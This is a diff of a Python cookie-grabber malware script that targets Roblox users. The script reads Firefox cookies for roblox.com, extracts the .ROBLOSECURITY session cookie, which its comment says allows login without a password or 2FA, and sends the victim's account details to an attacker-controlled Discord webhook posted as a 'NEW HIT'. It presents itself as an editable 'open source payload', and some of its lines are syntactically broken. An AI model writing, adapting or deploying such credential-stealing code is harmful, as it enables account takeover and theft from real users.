@@ -2,7 +2,7 @@ import os
 import base64, codecs
 import json
 
-webhookk = "WEBHOOK" # Remove the word "webhook" and paste your own there.
+webhookk = "WEBHOOK" # Remove the word "webhook" and paste your own one there.
 
 def command(c):
     os.system(c)
@@ -38,7 +38,7 @@ print(dummy_message)
 ################### Gathering INFOMATION #################################
 def cookieLogger():
 
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used to log into the specific account without password or 2fa."
+    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used to log into the specific account without password or 2fa.)
 
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
@@ -123,12 +123,12 @@ premium = info['IsPremium']
 discord = Discord(url=webhookk)
 discord.post(
     username="Payload Grabber"
-    avatar_url="https://share.creavite.co/Mtwi9mwtB8NDDsn3.gif",
+    avatar_url="https://cdn.discordapp.com/attachments/991075594420748319/1043931056073621744/Main_Logo.png",
     embeds=[
         {
             "username": "Payload Grabber"
             "title": "🔥+1 NEW HIT!🔥"
-            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) This is open source payload. You can edit it aswell.",
+            "description" : f"[Source Code](https://github.com/TheGeekLucas/NEO-Grabber) | [Rolimons]({rolimons}) This is open source payload. You can edit it aswell.",
             "color" : 8819de,
             "fields": [
                 {"name": "Username", "value": username, "inline": True},
